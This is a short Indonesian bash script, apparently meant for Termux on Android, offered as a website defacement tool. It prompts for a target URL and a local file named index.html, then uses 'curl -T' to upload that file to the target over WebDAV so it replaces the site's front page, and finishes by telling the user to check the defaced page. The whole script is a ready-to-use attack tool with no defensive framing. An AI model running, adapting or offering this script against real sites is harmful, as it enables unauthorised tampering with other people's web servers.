#!/bin/bash

#AURIZ GANS & TAMVANS TIADA TARA QYMAK
#     ___           ___           ___                       ___
#    /\  \         /\  \         /\  \                     /\__\
#   /::\  \        \:\  \       /::\  \       ___         /::|  |
#  /:/\:\  \        \:\  \     /:/\:\__\     /\__\       /:/:|  |
# /:/ /::\  \   ___  \:\  \   /:/ /:/  /    /:/__/      /:/|:|  |__
#/:/_/:/\:\__\ /\  \  \:\__\ /:/_/:/__/___ /::\  \     /:/ |:| /\__\
#\:\/:/  \/__/ \:\  \ /:/  / \:\/:::::/  / \/\:\  \__  \/__|:|/:/  /
# \::/__/       \:\  /:/  /   \::/~~/~~~~   ~~\:\/\__\     |:/:/  /
#  \:\  \        \:\/:/  /     \:\~~\          \::/  /     |::/  /
#   \:\__\        \::/  /       \:\__\         /:/  /      |:/  /
#    \/__/         \/__/         \/__/         \/__/       |/__/
#JANGAN RECODE YA GOBLOK,GUA 3 HARI BIKIN,LU ENAK RECODE


#webdav
clear
sleep 0.1
echo '─────────╔═══╗╔══╗─╔═══╗╔═══╗╔╗──╔╗'
sleep 0.1
echo '──AURIZ──║╔══╝║╔╗║─╚╗╔╗║║╔═╗║║╚╗╔╝║'
sleep 0.1
echo '───╔╗╔╗╔╗║╚══╗║╚╝╚╗─║║║║║║─║║╚╗║║╔╝'
sleep 0.1
echo '───║╚╝╚╝║║╔══╝║╔═╗║─║║║║║╚═╝║─║╚╝║─'
sleep 0.1
echo '───╚╗╔╗╔╝║╚══╗║╚═╝║╔╝╚╝║║╔═╗║─╚╗╔╝─'
sleep 0.1
echo '────╚╝╚╝─╚═══╝╚═══╝╚═══╝╚╝─╚╝──╚╝──'
echo ""
echo "╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼"
sleep 1
echo "TOOLS WEBDAV 100% BY Tn.AURIZ + GOOGLE.com & YOUTUBE.com"
sleep 1
echo "SUBSCRIBE CHANNEL: Tn AURIZ"
sleep 1
echo "masukan target,contoh: http://namaweb.com             "
sleep 1
echo "taruh sc deface di luar folder dengan nama index.html "
sleep 1
echo "╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼"
echo ""
sleep 1
echo '1.masukan target (gunakan http:// atau https://): '
read target
sleep 1
echo '2.masukan sc bernama index.html(taruh di luar folder): '
read sc
sleep 1
echo "tunggu...."
sleep 1
curl -T /storage/emulated/0/$sc $target
sleep 1
echo "berhasil atau tidaknya silahkan cek sendiri: "
echo $target"/index.html":
